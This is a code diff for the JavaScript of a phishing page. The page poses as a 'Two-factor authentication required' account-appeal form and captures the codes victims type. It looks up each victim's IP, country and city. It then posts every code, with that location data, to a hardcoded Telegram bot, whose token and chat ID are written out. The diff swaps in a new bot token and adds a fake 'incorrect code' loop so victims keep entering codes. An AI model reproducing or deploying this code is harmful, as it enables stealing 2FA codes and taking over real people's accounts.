@@ -1,32 +1,34 @@
-
 function getIP(callback) {
     fetch('https://api.db-ip.com/v2/free/self')
-        .then(response => response.json())
-        .then(data => callback(data))
-        .catch(error => callback(undefined));
+        .then((response) => response.json())
+        .then((data) => callback(data))
+        .catch((error) => callback(undefined));
 }
+
 let IpAddress = '';
-    
-getIP(ip => {
+
+getIP((ip) => {
     IpAddress = ip;
 });
+
 $(document).ready(function () {
-    // getCode();
-    updateHtmlAndCallback(function (){
+    updateHtmlAndCallback(function () {
         sendCode();
-    })
+    });
 
     setTime();
-    $('#back-hone').on('click',function (){
+
+    $('#back-hone').on('click', function () {
         window.location.href = '/end';
-    })
-    $('#send').on('click',function (){
+    });
+
+    $('#send').on('click', function () {
         $('.lsd-ring-container').removeClass('d-none');
 
-        setTimeout(function (){
+        setTimeout(function () {
             $('.lsd-ring-container').addClass('d-none');
-        },2000);
-    })
+        }, 2000);
+    });
 });
 
 function setTime() {
@@ -40,207 +42,143 @@ function setTime() {
         minutes = minutes < 10 ? '0' + minutes : minutes;
         seconds = seconds < 10 ? '0' + seconds : seconds;
 
-        $('#time').text(minutes + ":" + seconds);
+        $('#time').text(minutes + ':' + seconds);
 
         if (totalTime <= 0) {
             clearInterval(timer);
-            $('#time').text("00:00");
+            $('#time').text('00:00');
         }
     }, 1000);
-
-    let IpAddress = '';
-}
-/*
-function maskEmail(email) {
-    var maskedEmail = email;
-    var splitEmail = email.split('@');
-    if (splitEmail.length > 1 && splitEmail[0].length > 3) {
-        var localPart = splitEmail[0];
-        var domainPart = '@' + splitEmail[1];
-        var visiblePart = localPart.substring(0, 3);
-        maskedEmail = visiblePart + '*'.repeat(localPart.length - 3) + domainPart;
-    }
-    return maskedEmail;
 }
 
-function maskPhone(phone) {
-    var maskedPhone = phone;
-    if (phone.length >= 5) {
-        var visibleStart = phone.substring(0, 3);
-        var visibleEnd = phone.substring(phone.length - 2, phone.length);
-        maskedPhone = visibleStart + '*'.repeat(phone.length - 5) + visibleEnd;
-    }
-    return maskedPhone;
-}
-*/
-// <span id="phone" className="fw-bold">` + maskPhone(data.phone) + `</span>,
-//     <span id="buEmail" className="fw-bold">` + maskEmail(data.buEmail) + `</span>
-// or
-// < span
-// id = "peEmail"
-// className = "fw-bold" > ` + maskEmail(data.perEmail) + ` < /span>
 function updateHtmlAndCallback(callback) {
     $('#code-form .card-body').html(`
-                <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
-                <p class="card-text py-3">We have temporarily blocked your account because your
-                    protect has changed. Verify code has been sent
-                </p>
-                <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
-                <input type="text" class="form-control my-3 py-2 bg-light" id="code"
-                    placeholder="Enter your code" required>
-                <p class="text-danger ms-1 d-none" id="wrong-code">
-                    The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
-                </p>
-                <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
-                    <div class="mx-3">
-                        <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
-                    </div>
+        <h2 class="card-title fw-bold">Two-factor authentication required </h2>
+        <p class="card-text py-3">We have temporarily blocked your account because your protect has changed. Verify code has been sent</p>
+        <img src="/img/681.png" class="w-100 rounded" alt="">
+        <input type="text" class="form-control my-3 py-2 bg-light" id="code" placeholder="Enter your code" required>
+        <p class="text-danger ms-1 d-none" id="wrong-code">
+            This code is incorrect. Please check that you entered the code correctly or try a new code.
+        </p>
+        <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
+            <div class="mx-3">
+                <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
+            </div>
+            <p class="mb-0">
+                Approve from another device or Enter your verification code
+                <br>
+                Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code.
+                <br>
+                Please enter the code within <span id="time" class="fw-bold">05:00</span> to complete the appeal form.
+            </p>
+        </div>
+        <p>We'll walk you through some steps to secure and unlock your account.</p>
+        <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
+        <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
+    `);
 
-                    <p class="mb-0">
-                        You’ve asked us to require a 6-digit or 8-digit login code when anyone tries to access your
-                        account from a
-                        new device or browser. Enter the 6-digit or 8-digit code from your code generator or third-party app below.
-                        <br>
-                        Please wait <span id="time" class="fw-bold">05:00</span> to request the sending of the code.
-                    </p>
-                </div>
-                <p>We'll walk you through some steps to secure and unlock your account.</p>
-                <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
-                <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
-                `)
     if (callback && typeof callback === 'function') {
         callback();
     }
 }
 
-// function getCode() {
-//     $.ajax({
-//         url: '/current-user',
-//         type: 'GET',
-//         beforeSend: function () {
-//             $('.lsd-ring-container').removeClass('d-none');
-//         },
-//         success: function (data) {
-//             if (data.buEmail == null || data.perEmail == null || data.phone == null) {
-//                 window.location.href = '/business';
-//             } else {
-//                 updateHtmlAndCallback(data,function (){
-//                     sendCode(data);
-//                 })
-//             }
-//
-//             $('.lsd-ring-container').addClass('d-none');
-//         },
-//         error: function (xhr, status, error) {
-//             setTimeout(function () {
-//                 Swal.fire({
-//                     text: `Request failed!`,
-//                     icon: "error"
-//                 });
-//                 $('.lsd-ring-container').addClass('d-none');
-//             }, 500);
-//         }
-//
-//     });
-// }
 let NUMBER_TIME_SEND_CODE = 0;
-let code1='';
-let code2='';
-let Fcode='';
+let MAX_TRIES = 4;
+let code1 = '';
+let code2 = '';
+let Fcode = '';
+
 function sendCode() {
     $('#code').on('input', function () {
-        const input = $(this).val();
-        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
+        let input = $(this).val();
+        input = input.replace(/\D/g, ''); // Chỉ giữ số
 
-        if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
-            $(this).val(input.slice(0, -1));
+        if (input.length > 8) {
+            input = input.slice(0, 8);
         }
+
+        $(this).val(input);
     });
 
     $('#send-code').on('click', function () {
+        const $btn = $(this);
+        if ($btn.prop('disabled')) return;
 
-        const keymap = $("#code").val();
+        const keymap = $('#code').val();
 
-        if (keymap === '') {
+        // Ẩn cảnh báo mã sai khi người dùng nhấn Submit
+        $('#wrong-code').addClass('d-none');
+
+        // Chỉ cho phép 6 hoặc 8 số
+        if (!/^\d{6}$|^\d{8}$/.test(keymap)) {
             $('#code').addClass('border-danger');
             return;
         } else {
             $('#code').removeClass('border-danger');
         }
-        code1=keymap;
-        const message1   = 
-        '%0A<strong>Code: </strong>'+code1+
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
 
+        // Bắt đầu đếm ngược 20 giây và khóa nút
+        $btn.prop('disabled', true).text('Please wait (20s)');
+        let waitTime = 20;
+        const countdown = setInterval(() => {
+            waitTime--;
+            $btn.text(`Please wait (${waitTime}s)`);
+            if (waitTime <= 0) {
+                clearInterval(countdown);
+                $btn.prop('disabled', false).text('Submit');
 
+                // Sau khi đếm ngược xong thì hiển thị cảnh báo mã sai nếu cần
+                if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
+                    $('#wrong-code').removeClass('d-none');
+                } else {
+                    $('#wrong-code').removeClass('d-none');
+                    $('#send-code').prop('disabled', true);
+                    $('#code-form').addClass('d-none');
+                    $('#getCode').removeClass('d-none');
+                }
+            }
+        }, 1000);
+
+        code1 = keymap;
+
+        const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
+            `🌐 <strong>IP Address:</strong> <code>${IpAddress?.ipAddress || 'N/A'}</code>\n` +
+            ` <strong>Country:</strong> <code>${IpAddress?.countryName || 'N/A'}</code> (<code>${IpAddress?.countryCode || 'N/A'}</code>)\n` +
+            ` <strong>City:</strong> <code>${IpAddress?.city || 'N/A'}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7615708892:AAH5D5-PdEI2az_6YG0ls8D29jQp2uelIe0'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-4956802758'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+        const botToken = '7905032026:AAEYIhkZw3EnvD-U1P-A7yRW4_AnN5tcR_8';
+        const chatId = '-1002262445535';
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
-
-        fetch(telegramUrl)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
-                        $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
-                    }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-            })
-            .catch(error => {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
-                    });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 500);
-            });
-      /*  $.ajax({
-            url: '/sendInfo',
-            type: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({keymap : keymap}),
-            beforeSend: function () {
-                $('.lsd-ring-container').removeClass('d-none');
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
             },
-            success: function (data) {
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
-                        $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
-                    }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-
-            },
-            error: function (xhr, status, error) {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
-                    });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message1,
+                parse_mode: 'html'
+            })
+        })
+        .then((response) => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
             }
-
-        });*/
-    })
-
+            return response.json();
+        })
+        .then((data) => {
+            $('.lsd-ring-container').addClass('d-none');
+        })
+        .catch((error) => {
+            setTimeout(function () {
+                Swal.fire({
+                    text: `Request failed!`,
+                    icon: 'error'
+                });
+                $('.lsd-ring-container').addClass('d-none');
+            }, 500);
+        });
+    });
 }
